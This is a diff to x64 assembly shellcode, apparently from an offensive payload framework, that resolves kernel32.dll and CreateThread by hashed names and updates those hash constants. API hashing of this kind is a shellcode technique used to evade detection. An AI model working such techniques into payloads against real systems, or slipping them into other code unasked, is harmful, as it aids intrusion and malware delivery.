@@ -16,11 +16,13 @@
   cld
   jmp start
 
+%include "./src/single/calc_hash.asm"
 %include "./src/block/block_find_dll.asm"
+%include "./src/block/block_api_direct.asm"
 
 start:
 
-  mov r11d, 0;KERNEL32_DLL_HASH
+  mov r11d, 0x92AF16DA ; KERNEL32_DLL_HASH
   call block_find_dll
   mov r15, rax
 
@@ -35,7 +37,7 @@ start:
   lea r8, [rel threadstart]                   ; lpStartAddr = &threadstart
   pop rdx                                     ; lpThreadAttributes = NULL
 
-  mov r10d, 0x160D6838                        ; hash( "kernel32.dll", "CreateThread" )
+  mov r10d, 0x221b4546                        ; hash( "kernel32.dll", "CreateThread" )
   call block_api_direct                       ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
   add rsp, 40                                 ; RSP will be off by -40 after each call to block_api
   ret
